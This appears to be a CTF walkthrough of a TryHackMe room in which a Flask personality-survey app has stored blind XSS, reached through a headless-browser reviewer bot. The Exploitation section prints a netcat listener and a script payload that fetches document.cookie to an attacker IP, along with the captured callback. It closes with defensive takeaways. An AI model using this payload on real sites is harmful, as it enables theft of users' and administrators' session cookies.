---
title: "TryHackMe - Cupid's Matchmaker"
date: 2026-02-15
tags: ["tryhackme", "easy", "xss", "stored-xss", "blind-xss", "web", "cookie-theft"]
difficulty: "easy"
platform: "TryHackMe"
time_taken: "5 minutes"
draft: false
---

## Overview

Cupid's Matchmaker is a Valentine's Day themed easy-difficulty room featuring a personality survey web application. The brief boasts that "real humans" review every submission — a classic CTF hint for stored XSS with a bot reviewer. Injecting a JavaScript payload into the survey exfiltrates the reviewer's cookie, which contains the flag.

---

## Reconnaissance

The target runs a Flask web application on port 5000. The app presents a personality survey form that posts to `/survey` with the following fields:

```
name, age, gender, seeking, ideal_date, describe_yourself, looking_for, dealbreakers
```

After submission, the app confirms that a human matchmaker will review your profile. The "human reviewer" is actually a headless browser bot that opens submitted surveys — a simulated admin reviewing user content, which is the classic setup for stored XSS.

---

## Identifying the Vulnerability

The key indicator is in the room brief itself:

> *"real humans read your personality survey and personally match you with compatible singles. Our dedicated matchmaking team reviews every submission"*

In CTF terms, "a human reviews your submission" means a bot automatically opens submitted content in a browser. If any survey field is rendered as raw HTML without sanitisation, injected JavaScript will execute in the bot's browser context — and anything it has access to (cookies, local storage, the page DOM) can be exfiltrated to an attacker-controlled listener.

---

## Exploitation

Start a netcat listener to catch the callback:

```bash
nc -lvnp 4444
```

Submit the survey with the following XSS payload in the `describe_yourself` field:

```html
<script>fetch('http://10.66.69.15:4444/?c='+document.cookie)</script>
```

The bot reviewer opens the submission, the script executes in its browser context, and the cookie is sent back to the listener:

```
Connection received on 10.66.191.197 51148
GET /?c=flag=THM{REDACTED} HTTP/1.1
Host: 10.66.69.15:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 
            (KHTML, like Gecko) HeadlessChrome/144.0.0.0 Safari/537.36
Accept: */*
Origin: http://localhost:5000
Referer: http://localhost:5000/
```

The `User-Agent` confirms the reviewer is **HeadlessChrome** — a headless Chromium instance simulating the human matchmaker. The flag is stored directly in the reviewer's cookie.

---

## Key Takeaways

- **"A human reviews your content" always means XSS.** In CTF rooms and real bug bounties alike, any feature where an admin or moderator views user-submitted content is a stored XSS target. The payload executes in their privileged browser context.
- **Never store sensitive data in cookies without HttpOnly.** The flag was accessible via `document.cookie`, meaning the cookie lacked the `HttpOnly` flag. HttpOnly cookies cannot be read by JavaScript, which would have prevented this exfiltration entirely.
- **Sanitise all user input before rendering.** Every survey field should have HTML entities escaped before being rendered in the reviewer's browser. A single unsanitised field is enough for a full compromise.
- **Blind XSS is powerful.** The attacker never sees the reviewer's page — the payload fires silently in the background and phones home. Real-world blind XSS can exfiltrate session tokens, internal admin page contents, or trigger actions on behalf of privileged users.
